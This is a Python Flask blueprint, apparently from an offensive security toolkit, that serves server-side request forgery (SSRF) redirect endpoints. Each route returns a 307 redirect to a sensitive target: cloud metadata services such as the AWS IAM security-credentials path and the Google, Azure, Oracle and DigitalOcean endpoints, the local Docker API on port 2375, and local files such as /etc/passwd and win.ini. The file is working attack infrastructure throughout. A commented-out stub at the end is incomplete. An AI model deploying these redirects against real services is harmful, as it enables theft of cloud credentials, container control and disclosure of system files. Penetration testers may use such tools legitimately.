from meuk.hacksec import *
from flask import Blueprint, render_template, redirect, url_for, flash, send_from_directory, abort, request, Response
from meuk.flask.models import *
import glob

# Blueprint Configuration
ssrf_bp = Blueprint('ssrf_bp', __name__,
                    template_folder='html',
                    static_folder='static')


#basic website
@ssrf_bp.route('/ssrf/aws', methods=['HEAD','GET', 'POST'])
def ssrf_aws():
    return redirect('http://169.254.169.254/latest/meta-data/iam/security-credentials',code = 307)

@ssrf_bp.route('/ssrf/openstack', methods=['HEAD','GET', 'POST'])
def ssrf_openstack():
    #http://169.254.169.254/openstack
    return redirect('http://169.254.169.254/openstack',code = 307)

@ssrf_bp.route('/ssrf/google', methods=['HEAD','GET', 'POST'])
def ssrf_google():
    return redirect('http://metadata.google.internal/computeMetadata/v1beta1/?recursive=true', code = 307)

@ssrf_bp.route('/ssrf/oracle', methods=['HEAD','GET', 'POST'])
def ssrf_oracle():
    return redirect('http://192.0.0.192/latest/', code = 307)

@ssrf_bp.route('/ssrf/digitalocean', methods=['HEAD','GET', 'POST'])
def ssrf_digitalocean():
    return redirect('http://169.254.169.254/metadata/v1.json', code = 307)

@ssrf_bp.route('/ssrf/kubernetes', methods=['HEAD','GET', 'POST'])
def ssrf_kubernetes():
    return redirect('http://192.0.0.192/latest/', code = 307)

@ssrf_bp.route('/ssrf/azure', methods=['HEAD','GET', 'POST'])
def ssrf_azure():
    return redirect('http://169.254.169.254/metadata/v1/maintenance', code = 307)

@ssrf_bp.route('/ssrf/docker', methods=['HEAD','GET', 'POST'])
def ssrf_docker():
    return redirect('http://127.0.0.1:2375/v1.24/containers/json', code = 307)

@ssrf_bp.route('/ssrf/passwd', methods=['HEAD','GET', 'POST'])
def ssrf_passwd():
    return redirect('file:////etc/passwd', code = 307)

@ssrf_bp.route('/ssrf/winini', methods=['HEAD','GET', 'POST'])
def ssrf_winini():
    return redirect('file:///c:/windows/win.ini', code = 307)

'''
@ssrf_bp.route('/ssrf/exploit.html', methods=['HEAD','GET', 'POST'])
@ssrf_bp.route('/ssrf/exploit/', methods=['HEAD','GET', 'POST'])
@ssrf_bp.route('/ssrf/exploit', methods=['HEAD','GET', 'POST'])
def ssrf_exploit():
    if bestand:



    if redirect:
        return redirect('file:////etc/passwd', code = 307)
'''